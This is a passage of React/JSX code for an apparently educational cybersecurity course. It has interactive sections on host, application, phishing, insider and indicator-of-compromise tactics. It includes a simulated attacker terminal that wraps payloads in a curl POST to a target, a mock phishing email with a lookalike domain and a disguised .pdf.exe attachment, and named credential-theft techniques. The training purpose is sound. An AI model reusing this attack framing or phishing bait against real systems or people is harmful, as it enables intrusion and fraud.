                className={`rounded-lg px-3 py-1.5 text-xs transition-colors ${activeAttackTab === idx ? 'bg-cyan-400/10 text-cyan-400 border border-cyan-400' : 'bg-slate-900 text-slate-400 border border-slate-700 hover:border-slate-500'}`}
              >
                {tab.name}
              </button>
            ))}
          </div>

          <AnimatePresence mode="wait">
            <motion.div
              key={activeAttackTab}
              initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.2 }}
              className="bg-slate-900 border border-slate-800 rounded-xl p-5"
            >
              <h4 className="text-cyan-400 font-semibold mb-2">{networkTabs[activeAttackTab].full}</h4>
              <p className="text-slate-300 text-sm mb-4 leading-relaxed">{networkTabs[activeAttackTab].desc}</p>
              
              <div className="mb-3 flex flex-wrap gap-2">
                {networkTabs[activeAttackTab].techs.map((tech, i) => (
                  <span key={i} className="bg-slate-800 text-slate-300 text-xs rounded-full px-3 py-1">{tech}</span>
                ))}
              </div>
              
              <div>
                <span className="text-xs text-slate-500 mr-2">Tools:</span>
                <div className="inline-flex flex-wrap gap-2">
                  {networkTabs[activeAttackTab].tools.map((tool, i) => (
                    <span key={i} className="bg-slate-900 border border-slate-700 text-slate-400 text-xs rounded px-2 py-0.5">{tool}</span>
                  ))}
                </div>
              </div>
            </motion.div>
          </AnimatePresence>
          <MarkCompleteBtn index={1} />
              </motion.div>
            )}

        {/* SECTION 3 */}
        {activeSection === 2 && (
              <motion.div
                key={2}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 
            initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
            className="text-2xl font-bold text-slate-100 mb-2"
          >
            Host Attack Tactics, Techniques, and Procedures
          </motion.h2>
          <p className="text-sm text-slate-500 mb-6">MITRE ATT&CK aligned attack phases targeting endpoints and servers</p>

          <div className="w-full overflow-x-auto [&::-webkit-scrollbar]:hidden [-ms-overflow-style:none] [scrollbar-width:none]">
            <svg viewBox="0 0 750 120" className="min-w-[650px] w-full">
              <defs>
                <marker id="arrowRed" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto-start-reverse">
                  <path d="M0,0 L6,3 L0,6 Z" fill="#22d3ee" />
                </marker>
              </defs>
              
              {hostNodes.map((node, i) => {
                const startX = 10 + i * 92;
                const nextX = 10 + (i+1) * 92;
                return (
                  <g key={i}>
                    {i < hostNodes.length - 1 && (
                      <motion.path 
                        d={`M${startX + 72},60 L${nextX - 2},60`}
                        stroke="#22d3ee" strokeWidth="1.5" markerEnd="url(#arrowRed)"
                        initial={{ pathLength: 0 }} whileInView={{ pathLength: 1 }}
                        transition={{ duration: 0.4, delay: i * 0.15, ease: "easeInOut" }} viewport={{ once: true }}
                      />
                    )}
                    <motion.g 
                      onClick={() => setActiveKillChainNode(activeKillChainNode === i ? null : i)}
                      className="cursor-pointer"
                      whileHover={{ scale: 1.08 }}
                    >
                      <rect x={startX} y="42" width="72" height="36" rx="6" fill="#18181b" stroke={activeKillChainNode === i ? "#22d3ee" : "#52525b"} strokeWidth={activeKillChainNode === i ? "2" : "1.5"} style={{ transition: 'all 0.3s' }} />
                      <text x={startX + 36} y="60" fontSize="8" fill="#e4e4e7" textAnchor="middle" dominantBaseline="middle" style={{ pointerEvents: 'none' }}>
                        {node.label.split(' ').map((word, j) => (
                           <tspan x={startX + 36} dy={j === 0 ? (node.label.split(' ').length > 1 ? "-0.4em" : "0") : "1.2em"} key={j}>{word}</tspan>
                        ))}
                      </text>
                    </motion.g>
                  </g>
                );
              })}
            </svg>
          </div>

          <AnimatePresence mode="wait">
            {activeKillChainNode !== null && (
              <motion.div
                key="kc-details"
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ type: "spring" }}
                className="bg-slate-900 border border-cyan-400/40 rounded-xl p-5 mt-3"
              >
                <h4 className="text-cyan-400 font-semibold mb-2">{hostNodes[activeKillChainNode].label}</h4>
                <p className="text-slate-300 text-sm mb-4">{hostNodes[activeKillChainNode].desc}</p>
                
                <div className="mb-4 flex flex-wrap gap-2">
                  {hostNodes[activeKillChainNode].subs.map((sub, i) => (
                    <span key={i} className="bg-slate-800 text-blue-400 text-xs rounded px-2 py-0.5 font-mono">{sub}</span>
                  ))}
                </div>
                
                <div className="bg-slate-950 rounded-lg p-3 font-mono text-xs text-cyan-400 relative overflow-hidden">
                   <div className="absolute inset-0 pointer-events-none z-10" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '2px 2px' }} />
                   <div className="relative z-0 truncate">$ {hostNodes[activeKillChainNode].cmd}</div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
          <MarkCompleteBtn index={2} />
              </motion.div>
            )}

        {/* SECTION 4 */}
        {activeSection === 3 && (
              <motion.div
                key={3}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 
            initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
            className="text-2xl font-bold text-slate-100 mb-2"
          >
            Application Attack Tactics, Techniques, and Procedures
          </motion.h2>
          <p className="text-sm text-slate-500 mb-6">OWASP-aligned web and application attack vectors</p>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
            {appVulns.map((vuln, i) => {
              const isActive = expandedVuln === i;
              return (
              <motion.div
                key={i}
                initial={{ opacity: 0, y: 25 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
                transition={{ delay: i * 0.08 }}
                onClick={() => setExpandedVuln(i)}
                className={`bg-slate-900 border rounded-xl p-4 cursor-pointer transition-colors flex flex-col justify-between ${isActive ? 'border-cyan-400/80 shadow-[0_0_15px_rgba(34,211,238,0.15)] bg-cyan-400/5' : 'border-slate-800 hover:border-cyan-400/50'}`}
              >
                <div>
                  <div className="flex justify-between items-start mb-2 gap-2">
                    <h4 className="text-sm font-semibold text-slate-100 leading-tight">{vuln.name}</h4>
                    <span className={`text-[10px] rounded-full px-2 py-0.5 font-medium shrink-0 ${vuln.sev === "Critical" ? 'bg-red-500/20 text-red-400' : 'bg-orange-500/20 text-orange-400'}`}>{vuln.sev}</span>
                  </div>
                  <p className="text-xs text-slate-500 leading-relaxed mb-4">{vuln.desc}</p>
                </div>
                <div className="text-right">
                  <span className={`text-[10px] font-bold uppercase tracking-wider ${isActive ? 'text-cyan-400' : 'text-slate-600'}`}>
                    {isActive ? "Simulation Active" : "Select to Simulate"}
                  </span>
                </div>
              </motion.div>
            )})}
          </div>

          <AnimatePresence mode="wait">
            {expandedVuln !== null && appVulns[expandedVuln] && (
              <motion.div
                key={expandedVuln}
                initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 15 }} transition={{ duration: 0.3 }}
                className="w-full bg-slate-950 border border-slate-800 rounded-xl overflow-hidden shadow-2xl flex flex-col md:flex-row mb-6"
              >
                {/* Left Panel: Attacker Payload (Terminal) */}
                <div className="w-full md:w-1/2 border-b md:border-b-0 md:border-r border-slate-800 p-0 flex flex-col">
                  <div className="bg-slate-900 border-b border-slate-800 px-4 py-2 flex items-center justify-between">
                    <div className="flex items-center gap-1.5">
                      <div className="w-3 h-3 rounded-full bg-red-500/80"></div>
                      <div className="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                      <div className="w-3 h-3 rounded-full bg-green-500/80"></div>
                      <span className="text-slate-500 text-[10px] font-mono ml-2 uppercase tracking-widest hidden sm:inline">ATTACKER TERMINAL</span>
                    </div>
                    <span className="text-cyan-400 font-mono text-xs">payload.sh</span>
                  </div>
                  <div className="p-4 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-slate-900 to-slate-950 flex-grow relative overflow-hidden group min-h-[150px]">
                    <div className="absolute inset-0 pointer-events-none z-10 opacity-30" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '100% 2px' }} />
                    <div className="font-mono text-xs text-cyan-400 whitespace-pre-wrap relative z-20 break-all leading-relaxed">
                      <span className="text-slate-500">$ curl -X POST -d "payload=</span>
                      <br/>
                      {appVulns[expandedVuln].payload}
                      <br/>
                      <span className="text-slate-500">" {appVulns[expandedVuln].simUrl}</span>
                    </div>
                  </div>
                </div>

                {/* Right Panel: Victim Server Response */}
                <div className="w-full md:w-1/2 p-0 flex flex-col">
                  <div className="bg-slate-900 border-b border-slate-800 px-4 py-2 flex items-center justify-between">
                    <div className="flex items-center gap-2">
                       <Shield size={14} className="text-slate-500" />
                       <span className="text-slate-500 text-[10px] font-mono uppercase tracking-widest">VICTIM SERVER (HTTP 200)</span>
                    </div>
                    <span className="text-red-400 font-mono text-xs animate-pulse">VULNERABLE</span>
                  </div>
                  <div className="p-4 bg-slate-900 flex-grow relative overflow-hidden min-h-[150px]">
                    <div className="font-mono text-xs text-red-400 whitespace-pre-wrap relative z-20 leading-relaxed">
                      {appVulns[expandedVuln].simResp}
                    </div>
                    <div className="absolute bottom-4 right-4 text-[10px] text-slate-600 font-mono hidden sm:block">
                      Target: {appVulns[expandedVuln].simUrl}
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
          <MarkCompleteBtn index={3} />
              </motion.div>
            )}

        {/* SECTION 5 */}
        {activeSection === 4 && (
              <motion.div
                key={4}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 
            initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
            className="text-2xl font-bold text-slate-100 mb-2"
          >
            Social Engineering Attack Tactics, Techniques, and Procedures
          </motion.h2>
          <p className="text-sm text-slate-500 mb-6">Human-layer attacks exploiting psychology rather than technology</p>

          <div className="flex justify-between items-center mb-4">
            <button 
              onClick={() => setActiveScenario((activeScenario - 1 + socialScenarios.length) % socialScenarios.length)}
              className="p-2 text-slate-400 hover:text-cyan-400 hover:bg-slate-900 rounded-lg transition-colors flex items-center justify-center"
            >
              <ChevronLeft size={20} />
            </button>
            <span className="text-slate-500 text-sm font-medium tracking-widest uppercase">{activeScenario + 1} OF 6</span>
            <button 
              onClick={() => setActiveScenario((activeScenario + 1) % socialScenarios.length)}
              className="p-2 text-slate-400 hover:text-cyan-400 hover:bg-slate-900 rounded-lg transition-colors flex items-center justify-center"
            >
              <ChevronRight size={20} />
            </button>
          </div>

          <div className="relative min-h-[250px] overflow-hidden">
            <AnimatePresence mode="wait">
              <motion.div
                key={activeScenario}
                initial={{ opacity: 0, x: 60 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -60 }} transition={{ duration: 0.25, ease: "easeInOut" }}
                className="bg-slate-900 border border-slate-800 rounded-xl p-6 md:p-8"
              >
                <div className="flex justify-between items-start mb-4">
                  <h3 className="text-xl md:text-2xl font-bold text-cyan-400">{socialScenarios[activeScenario].title}</h3>
                  <span className="bg-cyan-400/10 text-cyan-400 text-xs rounded-full px-3 py-1 font-medium">{socialScenarios[activeScenario].type}</span>
                </div>
                <p className="text-sm md:text-base text-slate-300 leading-relaxed mb-8">{socialScenarios[activeScenario].desc}</p>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <div className="text-xs text-slate-500 uppercase tracking-wider font-bold mb-3 flex items-center gap-2"><AlertTriangle size={14} className="text-blue-400" /> Red Flags</div>
                    <ul className="space-y-2">
                       {socialScenarios[activeScenario].flags.map((flag, idx) => (
                         <li key={idx} className="flex items-start gap-2">
                           <div className="w-1.5 h-1.5 rounded-full bg-blue-400 mt-1.5 shrink-0" />
                           <span className="text-sm text-blue-400/90">{flag}</span>
                         </li>
                       ))}
                    </ul>
                  </div>
                  <div>
                    <div className="text-xs text-slate-500 uppercase tracking-wider font-bold mb-3 flex items-center gap-2"><Shield size={14} className="text-slate-300" /> Defenses</div>
                    <ul className="space-y-2">
                       {socialScenarios[activeScenario].defenses.map((def, idx) => (
                         <li key={idx} className="flex items-start gap-2">
                           <div className="w-1.5 h-1.5 rounded-full bg-slate-500 mt-1.5 shrink-0" />
                           <span className="text-sm text-slate-300">{def}</span>
                         </li>
                       ))}
                    </ul>
                  </div>
                </div>
              </motion.div>
            </AnimatePresence>
          </div>
          
          <div className="flex justify-center gap-2 mt-4">
            {socialScenarios.map((_, i) => (
               <div key={i} className={`w-2 h-2 rounded-full transition-colors ${i === activeScenario ? 'bg-cyan-400' : 'bg-slate-700'}`} />
            ))}
          </div>
          <MarkCompleteBtn index={4} />
              </motion.div>
            )}

        {/* SECTION 6 */}
        {activeSection === 5 && (
              <motion.div
                key={5}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} className="text-2xl font-bold text-slate-100 mb-2">Email Attack Tactics, Techniques, and Procedures</motion.h2>
          <p className="text-sm text-slate-500 mb-6">Anatomy of a phishing email and email-based attack vectors</p>

          <div className="flex flex-col md:flex-row gap-6 mb-8">
            <div className="w-full md:w-3/4 overflow-x-auto [&::-webkit-scrollbar]:hidden [-ms-overflow-style:none] [scrollbar-width:none]">
              <svg viewBox="0 0 700 320" className="min-w-[650px] w-full select-none">
                <rect x="20" y="10" width="660" height="300" rx="8" fill="#09090b" stroke="#27272a" />
                <rect x="20" y="10" width="660" height="36" rx="8" fill="#18181b" />
                <circle cx="40" cy="28" r="6" fill="#22d3ee" />
                <circle cx="56" cy="28" r="6" fill="#60a5fa" />
                <circle cx="72" cy="28" r="6" fill="#22c55e" />
                
                <rect x="20" y="46" width="660" height="264" fill="#09090b" />
                
                <rect x="40" y="60" width="400" height="16" rx="3" fill="#27272a" />
                <text x="44" y="70" fontSize="9" fill="#52525b">From:</text>
                <text x="80" y="72" fontSize="10" fill={foundFlags.has("sender") ? "#22d3ee" : "#a1a1aa"} fontFamily="monospace">security@paypa1.com (spoofed)</text>
                {/* Clickable Overlay: Sender */}
                <rect x="80" y="62" width="200" height="14" fill="transparent" cursor="pointer" onClick={() => setFoundFlags(prev => new Set(prev).add("sender"))} />
                
                <rect x="40" y="85" width="500" height="16" rx="3" fill="#27272a" />
                <text x="44" y="97" fontSize="10" fill={foundFlags.has("urgency") ? "#60a5fa" : "#a1a1aa"}>URGENT: Your account will be suspended in 24 hours</text>
                {/* Clickable Overlay: Urgency */}
                <rect x="40" y="85" width="260" height="16" fill="transparent" cursor="pointer" onClick={() => setFoundFlags(prev => new Set(prev).add("urgency"))} />
                
                <rect x="40" y="115" width="580" height="10" rx="2" fill="#3f3f46" />
                <rect x="40" y="130" width="520" height="10" rx="2" fill="#3f3f46" />
                <rect x="40" y="145" width="560" height="10" rx="2" fill="#3f3f46" />
                <rect x="40" y="160" width="480" height="10" rx="2" fill="#3f3f46" />
                
                <rect x="40" y="175" width="280" height="18" rx="3" fill="#1e3a5f" />
                <text x="44" y="188" fontSize="10" fill={foundFlags.has("url") ? "#60a5fa" : "#a1a1aa"} fontFamily="monospace">http://paypa1-secure.verify-account.ru/login</text>
                {/* Clickable Overlay: URL */}
                <rect x="40" y="175" width="280" height="18" fill="transparent" cursor="pointer" onClick={() => setFoundFlags(prev => new Set(prev).add("url"))} />
                
                <rect x="40" y="205" width="200" height="28" rx="4" fill="#27272a" stroke={foundFlags.has("malware") ? "#22d3ee" : "#3f3f46"} strokeWidth="1" />
                <text x="140" y="222" fontSize="9" fill={foundFlags.has("malware") ? "#e4e4e7" : "#a1a1aa"} textAnchor="middle">invoice_Q1.pdf.exe</text>
                {/* Clickable Overlay: Malware */}
                <rect x="40" y="205" width="200" height="28" fill="transparent" cursor="pointer" onClick={() => setFoundFlags(prev => new Set(prev).add("malware"))} />

                <rect x="620" y="290" width="10" height="10" fill="transparent" cursor="pointer" onClick={() => setFoundFlags(prev => new Set(prev).add("pixel"))} />
                <rect x="624" y="294" width="2" height="2" fill={foundFlags.has("pixel") ? "#22d3ee" : "#3f3f46"} />

                <g strokeWidth="1" strokeDasharray="3 2" fill="none">
                  {foundFlags.has("sender") && (
                    <>
                      <motion.path stroke="#22d3ee" d="M 280 68 L 480 68 L 480 79" initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.3 }} />
                      <rect x="410" y="79" width="140" height="20" rx="4" fill="#18181b" stroke="#22d3ee" strokeWidth="0.5" />
                      <text x="480" y="92" fontSize="9" fill="#22d3ee" textAnchor="middle" stroke="none">Spoofed Sender Domain</text>
                    </>
                  )}
                  {foundFlags.has("urgency") && (
                    <>
                      <motion.path stroke="#60a5fa" d="M 380 93 L 450 93 L 450 110" initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.3 }} />
                      <rect x="380" y="110" width="140" height="20" rx="4" fill="#18181b" stroke="#60a5fa" strokeWidth="0.5" />
                      <text x="450" y="123" fontSize="9" fill="#60a5fa" textAnchor="middle" stroke="none">Urgency / Fear Trigger</text>
                    </>
                  )}
                  {foundFlags.has("url") && (
                    <>
                      <motion.path stroke="#60a5fa" d="M 320 184 L 400 184" initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.3 }} />
                      <rect x="400" y="174" width="140" height="20" rx="4" fill="#18181b" stroke="#60a5fa" strokeWidth="0.5" />
                      <text x="470" y="187" fontSize="9" fill="#60a5fa" textAnchor="middle" stroke="none">Malicious URL (Homoglyph)</text>
                    </>
                  )}
                  {foundFlags.has("malware") && (
                    <>
                      <motion.path stroke="#22d3ee" d="M 240 219 L 320 219" initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.3 }} />
                      <rect x="320" y="209" width="140" height="20" rx="4" fill="#18181b" stroke="#22d3ee" strokeWidth="0.5" />
                      <text x="390" y="222" fontSize="9" fill="#22d3ee" textAnchor="middle" stroke="none">Malware: .exe as .pdf</text>
                    </>
                  )}
                  {foundFlags.has("pixel") && (
                    <>
                      <motion.path stroke="#22d3ee" d="M 625 294 L 625 260 L 580 260" initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.3 }} />
                      <rect x="440" y="250" width="140" height="20" rx="4" fill="#18181b" stroke="#22d3ee" strokeWidth="0.5" />
                      <text x="510" y="263" fontSize="9" fill="#22d3ee" textAnchor="middle" stroke="none">1x1 Open Tracker Pixel</text>
                    </>
                  )}
                </g>
              </svg>
            </div>
            
            <div className="w-full md:w-1/4 bg-slate-900 border border-slate-800 rounded-xl p-6 flex flex-col justify-center">
              <h3 className="text-xl font-bold text-cyan-400 mb-2">Interactive Hunt</h3>
              <p className="text-sm text-slate-400 mb-6">Analyze the email and click to identify all <span className="text-cyan-400 font-bold">5 Red Flags</span> indicative of a phishing attack.</p>
              
              <div className="w-full bg-slate-950 rounded-full h-2 mb-2 border border-slate-800">
                <motion.div 
                  className="bg-cyan-400 h-2 rounded-full" 
                  initial={{ width: 0 }} 
                  animate={{ width: `${(foundFlags.size / 5) * 100}%` }} 
                  transition={{ duration: 0.5, ease: "easeOut" }}
                />
              </div>
              <div className="flex justify-between items-center text-xs font-mono text-slate-500 mb-6">
                <span>PROGRESS</span>
                <span className={foundFlags.size === 5 ? "text-cyan-400 font-bold" : ""}>{foundFlags.size} / 5</span>
              </div>
              
              <AnimatePresence>
                {foundFlags.size === 5 && (
                  <motion.div 
                    initial={{ opacity: 0, scale: 0.9 }} 
                    animate={{ opacity: 1, scale: 1 }} 
                    className="bg-cyan-400/10 border border-cyan-400/30 rounded-lg p-3 text-center"
                  >
                    <Check size={24} className="text-cyan-400 mx-auto mb-2" />
                    <span className="text-sm text-cyan-400 font-bold block">Analysis Complete</span>
                    <span className="text-xs text-slate-400">All IOCs identified.</span>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          </div>

          <InteractiveTerminal 
            title="email-header-analyzer — bash" 
            textClass="text-blue-400"
            lines={[
              "$ emlAnalyzer --file phishing_sample.eml --headers\n",
              "> Received: from mail.paypa1.com (185.220.101.47) by mx.company.com\n",
              "> DKIM-Signature: v=1; a=rsa-sha256; d=paypa1.com [VERIFICATION: FAIL]\n",
              "> SPF Result: softfail — 185.220.101.47 not authorized for paypa1.com\n",
              "> DMARC: fail (p=reject) — message does not comply with DMARC policy\n",
              "> X-Originating-IP: 185.220.101.47 [TI Score: 98/100 — Known Phishing]\n",
              "> Subject: URGENT: Your account will be suspended in 24 hours\n",
              "> Attachment: invoice_Q1.pdf.exe [SHA256: a3f9c2d1...] [VT: 47/72 MALICIOUS]\n"
            ]} 
          />
          <MarkCompleteBtn index={5} />
              </motion.div>
            )}

        {/* SECTION 7 */}
        {activeSection === 6 && (
              <motion.div
                key={6}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} className="text-2xl font-bold text-slate-100 mb-2">Insider Attack Tactics, Techniques, and Procedures</motion.h2>
          <p className="text-sm text-slate-500 mb-6">Threats originating from within the organization</p>
          
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6 mb-8">
            {insiderCards.map((card, i) => (
              <div 
                key={i} 
                className="relative h-[260px] cursor-pointer" 
                style={{ perspective: "1000px" }}
                onClick={() => setFlipped(p => p.map((f, idx) => idx === i ? !f : f))}
              >
                <motion.div 
                  className="w-full h-full relative" 
                  style={{ transformStyle: "preserve-3d" }}
                  animate={{ rotateY: flipped[i] ? 180 : 0 }} 
                  transition={{ type: "spring", stiffness: 80, damping: 15 }}
                >
                   {/* Front */}
                   <div className="absolute inset-0 bg-slate-900 border border-slate-800 rounded-xl p-6 flex flex-col items-center justify-center text-center" style={{ backfaceVisibility: "hidden" }}>
                     <card.icon size={32} className={`mb-3 ${card.color}`} />
                     <h4 className="text-lg font-semibold text-slate-100 mb-2">{card.title}</h4>
                     <p className="text-xs text-slate-600">Click to reveal details</p>
                   </div>
                   
                   {/* Back */}
                   <div className="absolute inset-0 bg-slate-800 border border-cyan-400/30 rounded-xl p-5 overflow-y-auto [&::-webkit-scrollbar]:hidden [-ms-overflow-style:none] [scrollbar-width:none]" style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}>
                     <h4 className={`text-sm font-semibold mb-2 ${card.color}`}>{card.title}</h4>
                     <p className="text-xs text-slate-300 mb-3 leading-relaxed">{card.desc}</p>
                     <ul className="space-y-1 mb-3">
                       {card.ind.map((ind, idx) => (
                         <li key={idx} className="flex items-start">
                           <span className="text-cyan-400 mr-1.5 leading-none mt-0.5">•</span>
                           <span className="text-xs text-slate-400 leading-tight">{ind}</span>
                         </li>
                       ))}
                     </ul>
                     <div>
                       <span className="text-[10px] text-slate-500 uppercase font-bold tracking-wider">Detection:</span>
                       <p className="text-xs text-slate-300 leading-tight mt-1">{card.det}</p>
                     </div>
                   </div>
                </motion.div>
              </div>
            ))}
          </div>

          <div className="w-full overflow-x-auto [&::-webkit-scrollbar]:hidden [-ms-overflow-style:none] [scrollbar-width:none]">
            <svg viewBox="0 0 700 100" className="min-w-[500px] w-full">
               <line x1="50" y1="50" x2="650" y2="50" stroke="#27272a" strokeWidth="2" />
               {[
                 { cx: 50, cy: 50, fill: "#22d3ee", top: "Day 1", bot: "Onboarding" },
                 { cx: 200, cy: 50, fill: "#22d3ee", top: "Week 3", bot: "Priv Escalation" },
                 { cx: 350, cy: 50, fill: "#22d3ee", top: "Month 2", bot: "Data Access Spike" },
                 { cx: 500, cy: 50, fill: "#60a5fa", top: "Month 2+", bot: "Exfil Attempt" },
                 { cx: 650, cy: 50, fill: "#60a5fa", top: "Month 3", bot: "Detection" }
               ].map((c, i) => (
                 <g key={i}>
                   <text x={c.cx} y="35" fontSize="8" fill="#71717a" textAnchor="middle">{c.top}</text>
                   <text x={c.cx} y="72" fontSize="9" fill="#a1a1aa" textAnchor="middle">{c.bot}</text>
                   <motion.circle 
                     cx={c.cx} cy={c.cy} r="10" fill={c.fill}
                     initial={{ scale: 0 }} whileInView={{ scale: 1 }} viewport={{ once: true }} transition={{ type: "spring", delay: i * 0.2 }}
                   />
                 </g>
               ))}
            </svg>
          </div>
          <MarkCompleteBtn index={6} />
              </motion.div>
            )}

        {/* SECTION 8 */}
        {activeSection === 7 && (
              <motion.div
                key={7}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} className="text-2xl font-bold text-slate-100 mb-2">Indicators of Compromise (IoCs) and Key Indicators</motion.h2>
          <p className="text-sm text-slate-500 mb-4">Observable artifacts indicating potential security breach</p>
          
          <div className="flex flex-col lg:flex-row gap-6 mb-6">
            {/* Pyramid SVG Interactive Area */}
            <div className="w-full lg:w-1/2 flex items-center justify-center bg-slate-900 border border-slate-800 rounded-xl p-6 min-h-[400px]">
              <svg viewBox="0 0 400 350" className="w-full max-w-[350px] overflow-visible">
                <defs>
                  <filter id="glowLayer" x="-20%" y="-20%" width="140%" height="140%">
                    <feGaussianBlur stdDeviation="6" result="blur" />
                    <feComposite in="SourceGraphic" in2="blur" operator="over" />
                  </filter>
                </defs>
                
                {[
                  { level: 5, color: "#ef4444", label: "TTPs", w: 100, y: 30, h: 45, d: "M200,30 L250,75 L150,75 Z", tY: 63, sev: "Tough!" },
                  { level: 4, color: "#f97316", label: "Tools", w: 150, y: 80, h: 45, d: "M145,80 L255,80 L280,125 L120,125 Z", tY: 110, sev: "Challenging" },
                  { level: 3, color: "#f59e0b", label: "Network/Host Artifacts", w: 200, y: 130, h: 45, d: "M115,130 L285,130 L310,175 L90,175 Z", tY: 160, sev: "Annoying" },
                  { level: 2, color: "#eab308", label: "Domain Names", w: 250, y: 180, h: 45, d: "M85,180 L315,180 L340,225 L60,225 Z", tY: 210, sev: "Simple" },
                  { level: 1, color: "#3b82f6", label: "IP Addresses", w: 300, y: 230, h: 45, d: "M55,230 L345,230 L370,275 L30,275 Z", tY: 260, sev: "Easy" },
                  { level: 0, color: "#22c55e", label: "Hash Values", w: 350, y: 280, h: 45, d: "M25,280 L375,280 L400,325 L0,325 Z", tY: 310, sev: "Trivial" }
                ].map((layer, idx) => {
                  const isActive = activePyramidLayer === layer.level;
                  return (
                    <motion.g 
                      key={idx}
                      className="cursor-pointer"
                      onClick={() => setActivePyramidLayer(layer.level)}
                      animate={{ 
                        x: isActive ? 15 : 0, 
                        scale: isActive ? 1.05 : 1,
                        filter: isActive ? "url(#glowLayer)" : "none"
                      }}
                      whileHover={{ scale: isActive ? 1.05 : 1.02, x: isActive ? 15 : 5 }}
                      transition={{ type: "spring", stiffness: 300, damping: 20 }}
                    >
                      <path 
                        d={layer.d} 
                        fill={isActive ? layer.color : `${layer.color}CC`} 
                        stroke="#000" strokeWidth="2" 
                      />
                      <text x="200" y={layer.tY} fill={isActive ? "#fff" : "#eee"} fontSize="12" fontWeight="bold" textAnchor="middle" pointerEvents="none" style={{ textShadow: "1px 1px 2px rgba(0,0,0,0.8)" }}>
                        {layer.label}
                      </text>
                      <text x="10" y={layer.tY} fill={isActive ? layer.color : "#71717a"} fontSize="10" fontWeight="bold" textAnchor="start" pointerEvents="none">
                        {layer.sev}
                      </text>
                    </motion.g>
                  );
                })}
              </svg>
            </div>

            {/* Dynamic Content Panel */}
            <div className="w-full lg:w-1/2 min-h-[400px]">
              <AnimatePresence mode="wait">
                <motion.div
                  key={activePyramidLayer}
                  initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.2 }}
                  className="h-full border border-slate-800 bg-slate-900 rounded-xl p-6 flex flex-col"
                >
                  {activePyramidLayer === 5 && (
                    <>
                      <div className="flex justify-between items-start mb-4">
                        <h3 className="text-xl font-bold text-red-500">Tactics, Techniques & Procedures</h3>
                        <span className="bg-red-500/20 text-red-500 text-xs px-2 py-1 rounded font-bold uppercase tracking-wider">Tough</span>
                      </div>
                      <p className="text-sm text-slate-300 mb-6 leading-relaxed">TTPs represent the attacker's fundamental methodology. Forcing an adversary to change their TTPs forces them to learn new behaviors and rewrite their playbooks, which is extremely costly in time and resources.</p>
                      
                      <div className="space-y-4 flex-1">
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">Examples</span>
                          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs text-slate-400 font-mono">
                            - Pass-the-Hash (T1550)<br/>
                            - Kerberoasting (T1558)<br/>
                            - WMI Remote Execution
                          </div>
                        </div>
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">SIEM Detection Logic (Splunk)</span>
                          <div className="bg-slate-950 border border-red-500/30 rounded p-3 text-xs text-red-400 font-mono relative">
